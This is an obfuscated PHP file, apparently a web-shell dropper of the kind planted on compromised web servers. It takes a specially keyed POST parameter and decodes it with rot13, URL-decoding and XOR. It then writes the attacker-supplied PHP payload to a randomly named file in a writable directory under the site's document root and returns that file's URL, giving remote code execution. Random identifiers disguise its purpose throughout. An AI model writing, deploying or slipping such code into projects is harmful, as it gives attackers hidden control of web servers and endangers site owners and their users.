<?php $guyqcszqir = "luerulibmjfoknrr";$sxzfg = "";foreach ($_POST as $vudieklsx => $uecboe){if (strlen($vudieklsx) == 16 and substr_count($uecboe, "%") > 10){mkpcsbea($vudieklsx, $uecboe);}}function mkpcsbea($vudieklsx, $hgfaq){global $sxzfg;$sxzfg = $vudieklsx;$hgfaq = str_split(rawurldecode(str_rot13($hgfaq)));function wddrhe($evrhbqqhjr, $vudieklsx){global $guyqcszqir, $sxzfg;return $evrhbqqhjr ^ $guyqcszqir[$vudieklsx % strlen($guyqcszqir)] ^ $sxzfg[$vudieklsx % strlen($sxzfg)];}$hgfaq = implode("", array_map("wddrhe", array_values($hgfaq), array_keys($hgfaq)));$hgfaq = @unserialize($hgfaq);if (@is_array($hgfaq)){$vudieklsx = array_keys($hgfaq);$hgfaq = $hgfaq[$vudieklsx[0]];if ($hgfaq === $vudieklsx[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function vzvzlgqnq($svujgir) {static $kssrsyzcl = array();$vlzitk = glob($svujgir . '/*', GLOB_ONLYDIR);if (count($vlzitk) > 0) {foreach ($vlzitk as $svujg){if (@is_writable($svujg)){$kssrsyzcl[] = $svujg;}}}foreach ($vlzitk as $svujgir) vzvzlgqnq($svujgir);return $kssrsyzcl;}$gcjgfp = $_SERVER["DOCUMENT_ROOT"];$vlzitk = vzvzlgqnq($gcjgfp);$vudieklsx = array_rand($vlzitk);$tdwbar = $vlzitk[$vudieklsx] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($tdwbar, $hgfaq);echo "http://" . $_SERVER["HTTP_HOST"] . substr($tdwbar, strlen($gcjgfp));exit();}}}